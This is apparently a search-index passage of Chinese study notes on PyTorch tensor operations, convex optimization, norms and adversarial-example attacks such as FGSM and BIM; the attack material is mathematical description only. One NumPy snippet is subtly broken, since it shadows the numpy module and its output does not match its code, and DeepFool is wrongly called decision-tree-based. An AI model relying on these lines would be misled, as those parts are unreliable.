torch.cat([tensor, tensor, tensor], dim=1)\nprint(t1)\n</code></pre> <p>``` output tensor([[1., 0., 1., 1., 1., 0., 1., 1., 1., 0., 1., 1.],         [1., 0., 1., 1., 1., 0., 1., 1., 1., 0., 1., 1.],         [1., 0., 1., 1., 1., 0., 1., 1., 1., 0., 1., 1.],         [1., 0., 1., 1., 1., 0., 1., 1., 1., 0., 1., 1.]])</p>"}, {"location": "AI/PyTorch/BLITZ/lec01/#multiplying-tensors", "title": "Multiplying tensors", "text": "<ul> <li> <p>Computing the element-wise product</p> codeoutput <pre><code># This computes the element-wise product\nprint(f\"tensor.mul(tensor) \\n {tensor.mul(tensor)} \\n\")\n# Alternative syntax:\nprint(f\"tensor * tensor \\n {tensor * tensor}\")\n</code></pre> <pre><code>tensor.mul(tensor)\ntensor([[1., 0., 1., 1.],\n        [1., 0., 1., 1.],\n        [1., 0., 1., 1.],\n        [1., 0., 1., 1.]])\n\ntensor * tensor\ntensor([[1., 0., 1., 1.],\n        [1., 0., 1., 1.],\n        [1., 0., 1., 1.],\n        [1., 0., 1., 1.]])\n</code></pre> </li> <li> <p>Computing the matrix multiplication between two tensors</p> codeoutput <pre><code>print(f\"tensor.matmul(tensor.T) \\n {tensor.matmul(tensor.T)} \\n\")\n# Alternative syntax:\nprint(f\"tensor @ tensor.T \\n {tensor @ tensor.T}\")\n</code></pre> <pre><code>tensor.matmul(tensor.T)\ntensor([[3., 3., 3., 3.],\n        [3., 3., 3., 3.],\n        [3., 3., 3., 3.],\n        [3., 3., 3., 3.]])\n\ntensor @ tensor.T\ntensor([[3., 3., 3., 3.],\n        [3., 3., 3., 3.],\n        [3., 3., 3., 3.],\n        [3., 3., 3., 3.]])\n</code></pre> </li> </ul>"}, {"location": "AI/PyTorch/BLITZ/lec01/#in-place-operations", "title": "In-place operations", "text": "<ul> <li>Operations that have a <code>_</code> suffix are in-place</li> <li>\u8fd9\u79cd\u64cd\u4f5c\u4f1a\u6539\u53d8\u88ab\u64cd\u4f5c\u7684\u5f20\u91cf\u672c\u8eab\uff0c\u4f8b\u5982 <code>x.copy_(y)</code>, <code>x.t_()</code>, \u5c06\u4f1a\u6539\u53d8 <code>x</code></li> </ul> Note <p>In-place operations \u53ef\u4ee5\u8282\u7701\u4e00\u4e9b\u5185\u5b58\uff0c\u4f46\u5728\u8ba1\u7b97\u5bfc\u6570\u65f6\u4f1a\u4e22\u5931\u5386\u53f2\u4fe1\u606f\u3002\u56e0\u6b64\uff0c\u4e0d\u9f13\u52b1\u4f7f\u7528\u5b83\u4eec\u3002</p> codeoutput <pre><code># tensor.add_(5)\ntensor.add_(5)\nprint(tensor)\n</code></pre> <pre><code>tensor([[6., 5., 6., 6.],\n        [6., 5., 6., 6.],\n        [6., 5., 6., 6.],\n        [6., 5., 6., 6.]])\n</code></pre>"}, {"location": "AI/PyTorch/BLITZ/lec01/#bridge-with-numpy", "title": "Bridge with NumPy", "text": "<p>Tensors on the CPU and NumPy arrays can share their underlying memory locations, and changing one will change the other.</p>"}, {"location": "AI/PyTorch/BLITZ/lec01/#tensor-to-numpy-array", "title": "Tensor to NumPy array", "text": "codeoutput <pre><code>t = torch.ones(5)\nprint(f\"t: {t}\")\nn = t.numpy()\nprint(f\"n: {n}\")\n</code></pre> <pre><code>t: tensor([1., 1., 1., 1., 1.])\nn: [1. 1. 1. 1. 1.]\n</code></pre> <ul> <li>A change in the tensor reflects in the NumPy array.</li> </ul> codeoutput <pre><code>t.add_(1)\nprint(f\"t: {t}\")\nprint(f\"n: {n}\")\n</code></pre> <pre><code>t: tensor([2., 2., 2., 2., 2.])\nn: [2. 2. 2. 2. 2.]\n</code></pre>"}, {"location": "AI/PyTorch/BLITZ/lec01/#numpy-array-to-tensor", "title": "NumPy array to Tensor", "text": "<pre><code>np = np.ones(5)\nt = torch.from_numpy(np)\n</code></pre> <ul> <li>Changes in the NumPy array reflects in the tensor.</li> </ul> codeoutput <pre><code>np.add(n, 1, out=n)\nprint(f\"t: {t}\")\nprint(f\"np: {np}\")\n</code></pre> <pre><code>t: tensor([2., 2., 2., 2., 2.], dtype=torch.float64)\nn: [2. 2. 2. 2. 2.]\n</code></pre>"}, {"location": "AI/PyTorch/BLITZ/lec02/", "title": "<code>torch.autograd</code>", "text": "<p> \u7ea6 4 \u4e2a\u5b57 </p> <p>To Be Continued</p>"}, {"location": "AI/PyTorch/BLITZ/lec03/", "title": "Neural Networks", "text": "<p> \u7ea6 2 \u4e2a\u5b57 </p>"}, {"location": "AI/PyTorch/BLITZ/lec04/", "title": "Training a Classifier", "text": "<p> \u7ea6 3 \u4e2a\u5b57 </p>"}, {"location": "AI/Triviality/", "title": "\u673a\u5668/\u6df1\u5ea6\u5b66\u4e60\u6742\u9879", "text": "<p> \u7ea6 32 \u4e2a\u5b57 </p> <p>list</p> <ul> <li> \u51f8\u4f18\u5316</li> <li> \u5bf9\u6297\u653b\u51fb<ul> <li> FGSM</li> <li> BIM</li> <li> ILCM</li> <li> PGD</li> </ul> </li> <li> \u8303\u6570</li> <li> \u2026</li> </ul> <p>\u6301 \u7eed \u66f4 \u65b0 \u2026</p>"}, {"location": "AI/Triviality/ConvexOpt/", "title": "\u51f8\u4f18\u5316", "text": "<p> \u7ea6 1009 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p>"}, {"location": "AI/Triviality/ConvexOpt/#convex-set", "title": "\u51f8\u96c6 | Convex Set", "text": "<p>\u5bf9\u4e8e\u4e00\u4e2a\u51f8\u96c6 \\(C\\) </p> <ul> <li>\\(\\lceil\\) \u6570\u5b66\u5b9a\u4e49 \\(\\rfloor\\): </li> </ul> \\[ \\alpha x + (1 - \\alpha) y \\in C, ~~ \\forall x, y \\in C, \\alpha \\in [0, 1] \\] <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u5bf9\u4e8e\u51f8\u96c6 \\(C\\) \u4e2d\u7684\u4efb\u610f\u4e24\u4e2a\u70b9 \\(x, y\\)\uff0c\u5b83\u4eec\u7684\u7ebf\u6027\u7ec4\u5408 \\(\\alpha x + (1 - \\alpha) y\\) \u4e5f\u5728 \\(C\\) \u4e2d (\u5411\u91cf\u4e09\u70b9\u5171\u7ebf\u5b9a\u7406)</p> <ul> <li>\\(\\lceil\\) \u51e0\u4f55\u610f\u4e49 \\(\\rfloor\\): <ul> <li>\u5c06\u51f8\u96c6\u60f3\u8c61\u6210\u4e00\u4e2a\u5f62\u72b6\uff0c\u51f8\u96c6\u5185\u4efb\u610f\u4e24\u70b9\u7684\u8fde\u7ebf\u90fd\u5728\u51f8\u96c6\u5185\u90e8</li> </ul> </li> </ul>"}, {"location": "AI/Triviality/ConvexOpt/#_2", "title": "\u4e24\u4e2a\u91cd\u8981\u6027\u8d28", "text": "<p>\u5bf9\u673a\u5668\u5b66\u4e60\u5bf9\u5206\u7c7b\u95ee\u9898\uff0c\u5c24\u5176\u662f SVM \u7b49\u7b97\u6cd5\u7406\u8bba\u6709\u91cd\u8981\u652f\u6491\u4f5c\u7528</p> <ol> <li> <p>\\(\\lceil\\) Separating Hyperplane Theorem \\(\\rfloor\\):</p> <ul> <li>\u4e24\u4e2a\u4e0d\u76f8\u4ea4\u7684\u51f8\u96c6\u4e4b\u95f4\u5fc5\u7136\u5b58\u5728\u4e00\u4e2a\u5206\u5272\u8d85\u5e73\u9762\u4f7f\u5f97\u4e24\u4e2a\u51f8\u96c6\u5206\u522b\u5728\u8d85\u5e73\u9762\u7684\u4e24\u4fa7\u3002</li> <li> <p>\u5373\u5bf9\u975e\u7a7a\u51f8\u96c6 \\(C_1\\) \u548c \\(C_2\\)\uff0c \u4e14 \\(C_1 \\cap C_2 = \\emptyset\\), \u5219\u5fc5\u7136\u5b58\u5728 \\(a, b\\)\uff0c \u4f7f\u5f97</p> \\[ \\begin{matrix} a^T x \\leq b, ~~ \\forall x \\in C_1 \\\\ a^T x \\geq b, ~~ \\forall x \\in C_2 \\end{matrix} \\] </li> </ul> </li> <li> <p>\\(\\lceil\\) Supporting Hyperplane Theorem \\(\\rfloor\\):</p> </li> </ol> <ul> <li>\u51f8\u96c6\u8fb9\u754c\u4e0a\u7684\u4e00\u70b9\u5fc5\u7136\u5b58\u5728\u4e00\u4e2a\u652f\u6491\u8d85\u5e73\u9762\u7a7f\u8fc7\u8be5\u70b9</li> <li>\u5373\u5bf9\u975e\u7a7a\u51f8\u96c6 \\(C\\), \\(x_0\\) \u662f \\(C\\) \u7684\u8fb9\u754c\u4e0a\u7684\u4e00\u70b9(\u5373 \\(x_0 \\in \\text{bd}C\\))\uff0c\u5219\u5fc5\u7136\u5b58\u5728 \\(a \\ne 0\\) \u4f7f\u5f97 \\(a^T x \\leq a^T x_0, ~~ \\forall x \\in C\\), \u79f0 \\(\\{x | a^Tx = a^Tx_0 \\}\\) \u4e3a\u5728 \\(x_0\\) \u5904 \\(C\\) \u7684\u652f\u6491\u8d85\u5e73\u9762</li> <li></li> <li>\u9006\u5b9a\u7406\uff1a\u82e5\u5185\u90e8\u975e\u7a7a\u7684\u95ed\u96c6 \\(C\\) \u5728\u5b83\u7684\u8fb9\u754c\u4e0a\u4efb\u610f\u70b9\u90fd\u6709\u652f\u6491\u8d85\u5e73\u9762\uff0c\u5219 \\(C\\) \u662f\u51f8\u96c6</li> </ul>"}, {"location": "AI/Triviality/ConvexOpt/#operations-that-preserve-convexity", "title": "Operations that preserve convexity", "text": "<ol> <li>Intersection\uff1a\u51f8\u96c6\u7684\u4ea4\u96c6\u662f\u51f8\u96c6</li> <li>Scaling and translation: \u5982\u679c \\(C\\) \u662f\u51f8\u96c6\uff0c\u5219 \\(\\forall a, b\\), \\(aC + b = \\{ax + b | x \\in C \\}\\) \u662f\u51f8\u96c6</li> <li>Affine images and preimages: \u5982\u679c \\(f(x) = Ax + b\\)\uff0c\\(C\\) \u548c \\(D\\) \u662f\u51f8\u96c6\uff0c\u90a3\u4e48 \\(f(C) = \\{f(x) | x \\in C \\}\\) \u548c \\(f^{-1}(D) = \\{x | f(x) \\in D \\}\\) \u90fd\u662f\u51f8\u96c6</li> </ol> <p>2 \u548c 3 \u7684\u533a\u522b\u662f\uff1a</p> <ul> <li>2 \u4ec5\u5bf9\u51f8\u96c6\u505a\u4e86\u5c3a\u5ea6\u6216\u5e73\u79fb\u53d8\u6362</li> <li>3 \u4e2d \\(A\\) \u662f\u77e9\u9635\uff0c\\(b\\) \u662f\u5411\u91cf\uff0c\\(f\\) \u662f\u4eff\u5c04\u53d8\u6362\uff0c\u5373 \\(f(x) = Ax + b\\)\uff0c\\(f\\) \u65e2\u53ef\u4ee5\u5bf9\u51f8\u96c6\u505a\u5c3a\u5ea6\u6216\u5e73\u79fb\u53d8\u6362\uff0c\u4e5f\u53ef\u4ee5\u5bf9\u51f8\u96c6\u505a\u7ebf\u6027\u53d8\u6362</li> </ul>"}, {"location": "AI/Triviality/ConvexOpt/#epigraph", "title": "Epigraph", "text": "<p>\u5bf9\u4e8e\u4e00\u4e2a\u51fd\u6570 \\(f(x)\\) \uff0cEpigraph \u6307\u7684\u662f\u51fd\u6570 \\(f(x)\\) \u4e2d\u6216\u5176\u4e0a\u65b9\u7684\u90e8\u5206</p> <p>\u4f8b\u5982 \\(f(x) = x^2\\)\uff0c\u5219 Epigraph \u4e3a \\(y \\geq x^2\\) \u7684\u90e8\u5206</p>"}, {"location": "AI/Triviality/ConvexOpt/#convex-function", "title": "\u51f8\u51fd\u6570 | Convex Function", "text": "<ul> <li>\u5b9a\u4e49\uff1a\u5b9a\u4e49\u5728 \\(\\mathbb{R}^n \\rightarrow \\mathbb{R}\\) \u4e0a\u7684\u51fd\u6570 \\(f\\) \u662f\u51f8\u51fd\u6570\uff0c\u5f53\u4e14\u4ec5\u5f53\u5bf9\u4e8e \\(f\\) \u7684\u5b9a\u4e49\u57df \\(\\mathbb{D}\\) \u662f\u51f8\u96c6\u4e14 \\(\\forall x, y \\in \\mathbb{D}\\) \u548c \\(\\forall \\alpha \\in [0, 1]\\)\uff0c\u6709 \\(f(\\alpha x + (1 - \\alpha) y) \\leq \\alpha f(x) + (1 - \\alpha) f(y)\\) \u6210\u7acb</li> </ul>"}, {"location": "AI/Triviality/ConvexOpt/#_3", "title": "\u4e00\u9636\u5145\u8981\u6761\u4ef6", "text": "<ul> <li>\u5047\u8bbe\u5b9a\u4e49\u5728 \\(\\mathbb{R}^n \\rightarrow \\mathbb{R}\\) \u4e0a\u7684\u51fd\u6570 \\(f\\) \u53ef\u5fae\uff08\u5373 \\(\\forall x \\in \\mathbb{D}(f)\\), \u68af\u5ea6 \\(\\nabla f(x)\\) \u5b58\u5728\uff09\uff0c\u5219 \\(f\\) \u662f\u51f8\u51fd\u6570\u5f53\u4e14\u4ec5\u5f53\u5b9a\u4e49\u57df\u662f\u51f8\u96c6\u4e14 \\(\\forall x, y \\in \\mathbb{D}\\)\uff0c\u6709 \\(f(y) \\geq f(x) + \\nabla f(x)^T (y - x)\\) \u6210\u7acb</li> <li>\u4ece\u51e0\u4f55\u610f\u4e49\u8bb2\uff0c\u5373\u5b9a\u4e49\u57df\u5185\u6240\u6709\u51fd\u6570\u503c\u90fd\u5927\u4e8e\u7b49\u4e8e\u8be5\u70b9\u7684\u5207\u7ebf\u503c</li> </ul>"}, {"location": "AI/Triviality/ConvexOpt/#_4", "title": "\u4e8c\u9636\u5145\u8981\u6761\u4ef6", "text": "<p>\u8bb0\u51fd\u6570\u7684\u4e00\u9636\u5bfc\u6570\u548c\u4e8c\u9636\u5bfc\u6570\u5206\u522b\u4e3a \\(g\\) \u548c \\(H\\):</p> \\[ g(x) = \\nabla f(x) =  \\begin{bmatrix} \\frac{\\partial f(x)}{\\partial x_1} \\\\ \\frac{\\partial f(x)}{\\partial x_2} \\\\ \\vdots \\\\ \\frac{\\partial f(x)}{\\partial x_n} \\end{bmatrix} \\] \\[ H(x) = \\nabla^2 f(x) = \\begin{bmatrix} \\frac{\\partial^2 f(x)}{\\partial x_1^2} &amp; \\frac{\\partial^2 f(x)}{\\partial x_1 \\partial x_2} &amp; \\cdots &amp; \\frac{\\partial^2 f(x)}{\\partial x_1 \\partial x_n} \\\\ \\frac{\\partial^2 f(x)}{\\partial x_2 \\partial x_1} &amp; \\frac{\\partial^2 f(x)}{\\partial x_2^2} &amp; \\cdots &amp; \\frac{\\partial^2 f(x)}{\\partial x_2 \\partial x_n} \\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ \\frac{\\partial^2 f(x)}{\\partial x_n \\partial x_1} &amp; \\frac{\\partial^2 f(x)}{\\partial x_n \\partial x_2} &amp; \\cdots &amp; \\frac{\\partial^2 f(x)}{\\partial x_n^2} \\end{bmatrix} \\] <p>\u5047\u8bbe\u5b9a\u4e49\u5728 \\(\\mathbb{R}^n \\rightarrow \\mathbb{R}\\) \u4e0a\u7684\u51fd\u6570 \\(f\\) \u4e8c\u9636\u53ef\u5fae\uff08\u5373 \\(H(x)\\) \u5b58\u5728\uff09\uff0c\u5219 \\(f\\) \u662f\u51f8\u51fd\u6570\u5f53\u4e14\u4ec5\u5f53\u5b9a\u4e49\u57df\u662f\u51f8\u96c6\u4e14 \\(\\forall x \\in \\mathbb{D}\\)\uff0c\u6709\u6d77\u68ee\u77e9\u9635 \\(H(x) \\succeq 0\\) \u6210\u7acb \uff08\\(\\succeq\\) \u8868\u793a\u534a\u6b63\u5b9a\uff09</p> <ul> <li>\u76f4\u89c2\u6765\u8bb2\uff1a\u5982\u679c\u4e00\u4e2a\u51fd\u6570 \\(f\\) \u7684 Epigraph \u662f\u51f8\u96c6\uff0c\u5219\u79f0 \\(f\\) \u662f\u51f8\u51fd\u6570</li> </ul> <p>\u5982\u679c\u51fd\u6570 \\(f\\) \u7684\u4e8c\u9636\u5bfc\u6570\u5927\u4e8e\u7b49\u4e8e 0\uff08\u5bf9\u4e8e\u4e00\u7ef4\u51fd\u6570\uff09\u6216\u8005\u6d77\u68ee\u77e9\u9635\u662f\u534a\u6b63\u5b9a\u7684\uff08\u5bf9\u4e8e\u591a\u7ef4\u51fd\u6570\uff09\uff0c\u5219\u8be5\u51fd\u6570\u662f\u51f8\u51fd\u6570</p> <p></p> reference <ul> <li>CMU - Convex Optimization</li> <li>Convex Optimization(wrote by Boyd &amp; Vandenberghe)</li> </ul> <p>To Be Continued</p>"}, {"location": "AI/Triviality/Norm/", "title": "\u8303\u6570 | Norm", "text": "<p> \u7ea6 404 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p>"}, {"location": "AI/Triviality/Norm/#_1", "title": "\u5411\u91cf\u8303\u6570", "text": "<p>\u901a\u5e38\u5728\u673a\u5668\u5b66\u4e60\u4e2d\u4f1a\u770b\u5230\u5404\u79cd\u8ddd\u79bb\u548c\u8303\u6570\uff0c\u5982 \\(||\\boldsymbol{x}||\\), \\(||\\boldsymbol{X}||\\), \u5176\u4e2d \\(\\boldsymbol{x}\\) \u548c \\(\\boldsymbol{X}\\) \u5206\u522b\u8868\u793a\u5411\u91cf\u548c\u77e9\u9635</p> <p>\u4e3a\u65b9\u4fbf\u7edf\u4e00\uff0c\u5c06\u4efb\u610f\u5411\u91cf \\(\\boldsymbol{x}\\) \u7684 \\(l_p\\) -\u8303\u6570\u5b9a\u4e49\u4e3a\uff1a\\(||\\boldsymbol{x}||_p = (\\sum_{i=1}^n|x_i|^p)^{\\frac{1}{p}}\\) </p> <p>\u4e00\u822c\u4e0d\u52a0\u4e0b\u6807\u7684\u8868\u793a \\(l_2\\) - \u8303\u6570</p>"}, {"location": "AI/Triviality/Norm/#l_0-", "title": "\\(l_0\\) - \u8303\u6570", "text": "<p>Abstract</p> <p>\u8868\u793a\u5411\u91cf\u4e2d\u975e\u96f6\u5143\u7d20\u7684\u4e2a\u6570</p> <p>TODO</p>"}, {"location": "AI/Triviality/Norm/#l_1-", "title": "\\(l_1\\) - \u8303\u6570", "text": "<p>Abstract</p> <p>\u8868\u793a\u5411\u91cf\u4e2d\u5404\u4e2a\u5143\u7d20\u7edd\u5bf9\u503c\u4e4b\u548c</p> <p>TODO</p>"}, {"location": "AI/Triviality/Norm/#l_2-", "title": "\\(l_2\\) - \u8303\u6570", "text": "<p>Abstract</p> <p>\u8868\u793a\u5411\u91cf\u5404\u4e2a\u5143\u7d20\u7684\u5e73\u65b9\u548c\u7684\u5e73\u65b9\u6839</p> <p>TODO</p>"}, {"location": "AI/Triviality/Norm/#l_infty-", "title": "\\(l_{\\infty}\\) - \u8303\u6570", "text": "<p>Abstract</p> <p>\u8868\u793a\u5411\u91cf\u4e2d\u5404\u4e2a\u5143\u7d20\u7edd\u5bf9\u503c\u7684\u6700\u5927\u503c</p> <p>TODO</p> <p>\\(l_{-\\infty}\\) \u4e0e\u5176\u76f8\u53cd\uff0c\u8868\u793a\u6700\u5c0f\u503c</p>"}, {"location": "AI/Triviality/Norm/#_2", "title": "\u77e9\u9635\u8303\u6570", "text": "<p>\u5047\u8bbe\u77e9\u9635 \\(\\boldsymbol{A}\\) \u7684\u7ef4\u5ea6\u4e3a \\(m\\times n\\)</p> <ol> <li>1-\u8303\u6570 | \\(||\\boldsymbol{A}||_1 = \\max_{1\\leq j\\leq n}\\sum_{i=1}^m|a_{ij}|\\)<ul> <li>\u5217\u8303\u548c\u6570\uff0c\u5373\u6240\u6709\u77e9\u9635\u5217\u5411\u91cf\u7edd\u5bf9\u503c\u4e4b\u548c\u7684\u6700\u5927\u503c</li> </ul> </li> <li> <p>2-\u8303\u6570 \uff5c \\(||\\boldsymbol{A}||_2 = \\sqrt{\\lambda_{\\max}(\\boldsymbol{A}^T\\boldsymbol{A})} = \\sqrt{\\max_{1\\leq i\\leq n} |\\lambda_i|}\\)(\u5176\u4e2d \\(\\lambda_i\\) \u4e3a \\(\\boldsymbol{A}^T\\boldsymbol{A}\\) \u7684\u7279\u5f81\u503c)</p> <ul> <li>\u8c31\u8303\u6570\uff0c\u5373\u77e9\u9635 \\(\\boldsymbol{A}^T\\boldsymbol{A}\\) \u7684\u6700\u5927\u7279\u5f81\u503c\u7684\u5e73\u65b9\u6839</li> </ul> </li> <li> <p>\\(\\infty\\)-\u8303\u6570 | \\(||\\boldsymbol{A}||_{\\infty} = \\max_{1\\leq i\\leq m}\\sum_{j=1}^n|a_{ij}|\\)</p> <ul> <li>\u884c\u8303\u6570\uff0c\u5373\u6240\u6709\u77e9\u9635\u884c\u5411\u91cf\u7edd\u5bf9\u503c\u4e4b\u548c\u7684\u6700\u5927\u503c</li> </ul> </li> <li>F-\u8303\u6570 | \\(||\\boldsymbol{A}||_F = \\sqrt{\\sum_{i=1}^m\\sum_{j=1}^n|a_{ij}|^2} = \\sqrt{tr(\\boldsymbol{A}^T\\boldsymbol{A})}\\) (\u5176\u4e2d \\(tr(\\boldsymbol{A}) = a_{11} + \\dots + a_{nn}\\) \u8868\u793a\u77e9\u9635\u7684\u8ff9)<ul> <li>Frobenius \u8303\u6570\uff0c\u5373\u77e9\u9635 \\(\\boldsymbol{A}\\) \u7684\u6240\u6709\u5143\u7d20\u7edd\u5bf9\u503c\u7684\u5e73\u65b9\u548c\u7684\u5e73\u65b9\u6839</li> </ul> </li> </ol> Quote <p>\u5982\u4f55\u901a\u4fd7\u6613\u61c2\u5730\u89e3\u91ca\u300c\u8303\u6570\u300d</p>"}, {"location": "AI/Triviality/AdversarialAttack/", "title": "Adversarial Attack | \u5bf9\u6297\u653b\u51fb", "text": "<p> \u7ea6 389 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p>"}, {"location": "AI/Triviality/AdversarialAttack/#_1", "title": "\u4ec0\u4e48\u662f\u5bf9\u6297\u653b\u51fb", "text": "\u5bf9\u6297\u6837\u672c <p>\u5bf9\u6297\u6837\u672c\u662f\u6307\u5728\u539f\u59cb\u6837\u672c\u4e2d\u6dfb\u52a0\u4e86\u4e00\u4e9b\u6270\u52a8\uff0c\u4f7f\u5f97\u539f\u59cb\u6837\u672c\u88ab\u8bef\u5206\u7c7b\u7684\u6837\u672c\u3002\uff08\u8fd9\u6837\u7684\u6270\u52a8\u4e0d\u4f1a\u5f71\u54cd\u4eba\u7c7b\u7684\u8bc6\u522b\uff0c\u4f46\u53ef\u4ee5\u6709\u6548\u4f7f\u6a21\u578b\u4ea7\u751f\u8bef\u5224\uff09</p> <p>\u7531\u4e8e\u673a\u5668\u5b66\u4e60\u7b97\u6cd5\u7684\u8f93\u5165\u5f62\u5f0f\u662f\u4e00\u79cd\u6570\u503c\u578b\u5411\u91cf (numeric vector), \u56e0\u6b64\u901a\u8fc7\u8bbe\u8ba1\u4e00\u79cd\u9488\u5bf9\u6027\u7684\u6570\u503c\u578b\u5411\u91cf\uff0c\u53ef\u4ee5\u4f7f\u5f97\u673a\u5668\u5b66\u4e60\u7b97\u6cd5\u4ea7\u751f\u8bef\u5224\u3002\u8fd9\u79cd\u5bf9\u6a21\u578b\u8fdb\u884c\u653b\u51fb\u7684\u65b9\u5f0f\u79f0\u4e3a \u5bf9\u6297\u653b\u51fb (adversarial attack)</p>"}, {"location": "AI/Triviality/AdversarialAttack/#_2", "title": "\u5bf9\u6297\u653b\u51fb\u7684\u5206\u7c7b", "text": "<ol> <li>\u4ece\u653b\u51fb\u73af\u5883\u5212\u5206\uff1a<ul> <li>\u9ed1\u76d2\u653b\u51fb\uff1a\u653b\u51fb\u8005\u5bf9\u6a21\u578b\u7684\u7ed3\u6784\u548c\u53c2\u6570\u4e00\u65e0\u6240\u77e5\uff0c\u53ea\u80fd\u901a\u8fc7\u4f20\u5165\u6837\u672c\u548c\u89c2\u5bdf\u8f93\u51fa\u7ed3\u679c\u6765\u8fdb\u884c\u653b\u51fb</li> <li>\u767d\u76d2\u653b\u51fb\uff1a\u653b\u51fb\u8005\u5bf9\u6a21\u578b\u7684\u7ed3\u6784\u548c\u53c2\u6570\u5b8c\u5168\u4e86\u89e3</li> <li>\u7070\u76d2\u653b\u51fb\uff1a\u653b\u51fb\u8005\u5bf9\u6a21\u578b\u7684\u7ed3\u6784\u548c\u53c2\u6570\u4ec5\u4e86\u89e3\u4e00\u90e8\u5206</li> </ul> </li> <li>\u4ece\u653b\u51fb\u76ee\u7684\u5212\u5206\uff1a<ul> <li>\u65e0\u76ee\u6807\u653b\u51fb\uff1a\u5982\u5728\u56fe\u50cf\u5206\u7c7b\u4e2d\uff0c\u53ea\u9700\u8981\u4f7f\u5f97\u6a21\u578b\u4ea7\u751f\u8bef\u5224\u5373\u53ef</li> <li>\u6709\u76ee\u6807\u653b\u51fb\uff1a\u5982\u5728\u56fe\u50cf\u5206\u7c7b\u4e2d\uff0c\u9700\u8981\u4f7f\u5f97\u6a21\u578b\u5c06\u56fe\u50cf\u8bef\u5224\u4e3a\u67d0\u4e00\u7279\u5b9a\u7c7b\u522b</li> </ul> </li> <li>\u4ece\u6270\u52a8\u5f3a\u5ea6\u5212\u5206\uff1a<ul> <li>\u65e0\u7a77\u8303\u6570\u653b\u51fb\uff1a</li> <li>\u4e8c\u8303\u6570\u653b\u51fb\uff1a</li> <li>0 \u8303\u6570\u653b\u51fb\uff1a</li> </ul> </li> <li>\u4ece\u653b\u51fb\u5b9e\u73b0\u5212\u5206\uff1a<ul> <li>\u57fa\u4e8e\u68af\u5ea6\u7684\u653b\u51fb\uff1aFGSM(Fast Gradient Sign Method)\u3001BIM(Basic Iterative Method)\u3001ILCM(Iterative Least-likely Class Method)\u3001PGD(Projected Gradient Descent)\u3001MIM(Momentum Iterative Method) \u2026</li> <li>\u57fa\u4e8e\u4f18\u5316\u7684\u653b\u51fb: CW(Carlini &amp; Wagner) \u2026</li> <li>\u57fa\u4e8e\u51b3\u7b56\u6811\u7684\u653b\u51fb: DEEPFOOL \u2026</li> <li>\u2026</li> </ul> </li> </ol> <p>To Be Continued</p>"}, {"location": "AI/Triviality/AdversarialAttack/BIM/", "title": "BIM | Basic Iterative Method", "text": "<p> \u7ea6 1027 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>\u53c8\u79f0 I-FGSM (Iterative Fast Gradient Sign Method)</p> <p>paper</p> <p>\u8bba\u6587\u5730\u5740</p> <p>\u8bba\u6587\u4e3b\u8981\u63d0\u51fa\uff1a</p> <ul> <li>BIM \u653b\u51fb\u7b97\u6cd5</li> <li>ILCM (Iterative Least-likely Class Method) \u653b\u51fb\u7b97\u6cd5</li> <li>\u9a8c\u8bc1\u4e86\u5728\u771f\u5b9e\u7269\u7406\u73af\u5883\u4e2d\uff0c\u901a\u8fc7\u56fe\u50cf\u91c7\u96c6\u5f97\u5230\u7684\u5bf9\u6297\u6837\u672c\u662f\u5426\u4f9d\u65e7\u80fd\u591f\u4f7f\u5f97\u5206\u7c7b\u5668\u5206\u7c7b\u9519\u8bef(\u672c\u7bc7\u4e0d\u4ecb\u7ecd)</li> </ul>"}, {"location": "AI/Triviality/AdversarialAttack/BIM/#bim", "title": "BIM", "text": "<ul> <li>\u4e0e FGSM \u7c7b\u4f3c\uff0c\u90fd\u662f\u57fa\u4e8e\u68af\u5ea6\u7684\u653b\u51fb\u65b9\u6cd5\u3002\u4e0d\u540c\u7684\u662f\uff0cBIM \u662f\u4e00\u79cd\u8fed\u4ee3\u653b\u51fb\u65b9\u6cd5\uff1a<ul> <li>\u5bf9\u4e8e FGSM\uff0c\u6bcf\u6b21\u5bfb\u627e\u5bf9\u6297\u6837\u672c\uff0c\u6539\u53d8\u91cf\u662f \\(\\epsilon \\cdot sign(\\nabla_x J(\\boldsymbol{\\theta}, \\boldsymbol{x}, y))\\)\uff0c\u8fd9\u6837\u662f\u628a\u6bcf\u4e2a\u50cf\u7d20\u70b9\u90fd\u6539\u53d8\u4e86 \\(\\epsilon\\) \u7684\u91cf</li> <li>\u7531\u4e8e FGSM \u63d0\u51fa\u7684\u5047\u8bbe\u662f\uff1a\u76ee\u6807\u635f\u5931\u51fd\u6570\u662f\u8fd1\u4f3c\u7ebf\u6027\u7684\uff0c\u5373 \\(J(\\boldsymbol{\\theta}, \\boldsymbol{x}, y) \\approx \\boldsymbol{w}^T \\boldsymbol{x}\\)\u3002\u4e4b\u540e\u5728 \\(\\boldsymbol{x}\\) \u4e0a\u52a0\u4e00\u4e2a\u6270\u52a8 \\(\\boldsymbol{\\eta}\\)\uff0c\u4f7f\u5f97 \\(J(\\boldsymbol{\\theta}, \\boldsymbol{x}, y)\\) \u53d8\u5316\u6700\u5927\uff0c\u7531 \\(J(\\boldsymbol{\\theta}, \\boldsymbol{x + \\boldsymbol{\\eta}}, y) - J(\\boldsymbol{\\theta}, \\boldsymbol{x}, y) \\approx \\boldsymbol{w}^T \\boldsymbol{\\eta}\\) \u8981\u6700\u5927\uff0c\u6545\u800c \\(\\boldsymbol{\\eta} = \\epsilon \\cdot sign(\\nabla_x J(\\boldsymbol{\\theta}, \\boldsymbol{x}, y))\\)</li> </ul> </li> <li>\u4f46 BIM \u4f5c\u8005\u8868\u793a \\(J\\) \u548c \\(\\boldsymbol{x}\\) \u5f88\u53ef\u80fd\u4e0d\u662f\u9ad8\u5ea6\u7ebf\u6027\u5173\u7cfb\uff0c\u90a3\u4e48\u5c31\u53ef\u80fd\u5b58\u5728\u4e00\u4e2a\u5728 \\((0, \\boldsymbol{\\eta})\\) \u95f4\u7684\u6270\u52a8\uff0c\u4f7f\u5f97 \\(J(\\boldsymbol{\\theta}, \\boldsymbol{x}, y)\\) \u53d8\u5316\u66f4\u5927\u4e14\u6b64\u65f6 \\(\\boldsymbol{x}\\) \u7684\u6539\u53d8\u91cf\u5c0f\u4e8e 